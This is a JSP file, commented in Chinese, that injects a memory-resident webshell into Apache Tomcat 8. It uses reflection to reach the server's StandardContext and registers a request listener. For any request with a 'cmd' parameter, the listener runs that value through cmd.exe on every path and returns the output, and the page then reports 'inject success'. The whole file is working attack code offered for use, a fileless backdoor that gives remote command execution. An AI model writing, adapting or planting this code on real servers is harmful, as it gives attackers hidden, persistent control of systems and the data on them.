<%-- Tomcat8添加 SequestServletListener实现内存马
    添加之后全路径可用，所有的请求都会过requestServletListener
--%>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%
    String name = "listernshell";
    // 获取上下文
    ServletContext servletContext = request.getSession().getServletContext();

    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

    ServletRequestListener listener = new ServletRequestListener() {
        @Override
        public void requestDestroyed(ServletRequestEvent sre) {
            HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
            if (req.getParameter("cmd") != null){
                InputStream in = null;
                try {
                    in = Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",req.getParameter("cmd")}).getInputStream();
                    Scanner s = new Scanner(in).useDelimiter("\\A");
                    String output = s.hasNext()?s.next():"";
                    Field requestF = req.getClass().getDeclaredField("request");
                    requestF.setAccessible(true);
                    Request request = (Request)requestF.get(req);
                    PrintWriter out= request.getResponse().getWriter();
                    out.println(output);
                    out.flush();
                    out.close();
                }
                catch (IOException e) {}
                catch (NoSuchFieldException e) {}
                catch (IllegalAccessException e) {}
            }
        }

        @Override
        public void requestInitialized(ServletRequestEvent sre) {

        }
    };
    standardContext.addApplicationEventListener(listener);
    response.getWriter().write("inject success");
%>
